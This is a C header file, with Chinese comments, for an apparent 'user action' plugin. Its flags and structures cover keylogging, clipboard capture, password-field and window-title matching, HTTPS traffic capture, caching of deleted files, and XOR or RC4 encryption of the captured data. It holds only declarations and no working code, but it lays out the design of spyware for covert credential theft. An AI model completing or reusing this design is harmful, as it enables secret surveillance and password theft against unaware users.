/**************************************************************
 * Module:
 *      T5UserAction.h
 *
 * Author:
 *      XieBo(secman_xie@hotmail.com)
 *
 *
 * Notes:
 *		用户行为插件描述
 *
 */

#ifndef _TJ_T5_USER_ACTION_H_
#define _TJ_T5_USER_ACTION_H_


#define USER_ACT_FILE_OP             0x00000001   // 用户文件操作轨迹
#define USER_ACT_KEYBOARD            0x00000002   // 键盘记录
#define USER_ACT_CLIPBOARD           0x00000004   // 剪贴板信息
#define USER_ACT_PROC_TRACE          0x00000008   // 进程执行轨迹
#define USER_ACT_PROC_FILE           0x00000010   // 进程文件访问轨迹
#define USER_ACT_EA_PASSWD           0x00000020   // 编辑框EA_PASSWORD属性匹配
#define USER_ACT_PASSWD_KEYMATCH     0x00000040   // 窗口标题关键字匹配
#define USER_ACT_HTTPS_SEND          0x00000080   // HTTPS 发送
#define USER_ACT_HTTPS_RECV          0x00000100   // HTTPS 接收

#define USER_ACT_PLUGIN_VER          (1)          // 插件版本号

#pragma pack( push )
#pragma pack(1)

// 用户行为信息获取控制
//
typedef struct _USER_ACT_CFG
{
	DWORD	   dwSize;				              // 结构大小
	DWORD      dwFetch;                           // 获取信息配置
	DWORD      dwKeyListOffset;                   // 窗口标题关键字列表在头后的偏移量，内容以英文;分隔，
	DWORD      dwKeyListLength;                   // 窗口标题关键字长度，不包含截止符，UNICODE编码的长度
	WCHAR     *lpwzKeyList;                       // 此指针生成此结构时，请填NULL，功能模块得到数据后，自行修改
	BOOL       bGetDelFile;                       // 删除文件时缓存
	DWORD      dwMaxDelFile;                      // 删除文件的大小控制
	DWORD      dwGetDelFileOffset;                // 删除文件的类型在列表头后的偏移量
	DWORD      dwGetDelFileLength;                // 删除文件的类型长度，不包含截止符，UNICODE编码的长度
	WCHAR     *lpwzGetDelFileType;                // 此指针生成此结构时，请填NULL，功能模块得到数据后，自行修改

}USER_ACT_CFG, *PUSER_ACT_CFG;

//
// 删除文件缓存 头部
//
typedef struct tagUSER_DELFILE_HEADER
{
	DWORD		dwHeaderSize;				// 头大小

	WCHAR		wzRealPath[MAX_PATH];		// 文件原路径
	DWORD		dwFileSize;					// 文件大小

	FILETIME	ftCreationTime;				// 文件创建时间
	FILETIME	ftLastAccessTime;			// 文件最后访问时间
	FILETIME	ftLastWriteTime;			// 文件最后修改时间

	FILETIME	ftActionTime;				// 文件缓存时间

} USER_DELFILE_HEADER,
*PUSER_DELFILE_HEADER;

//
// 保存文件的头部
//
typedef struct _USER_ACT_FHEADER
{
	DWORD		dwSize;					          // 结构体大小
	DWORD		dwPluginId;				          // 插件Id
	DWORD       dwVersion;                        // 插件版本号
	DWORD		dwMagicNumber;			          // 魔术数
	DWORD       dwInfoType;                       // 0 - 用户行为信息，如键盘记录，密码等，1 - 删除的文件
	DWORD       dwEncryptAlg;                     // 加密算法，0 - 无加密，1 - 异或，2 - RC4
	CHAR        chKey;                            // 异或种子
	CHAR        szRc4Key[MAX_PATH];               // RC4密钥

}USER_ACT_FHEADER, *PUSER_ACT_FHEADER;

#pragma pack( pop )


#endif  // _TJ_T5_USER_ACTION_H_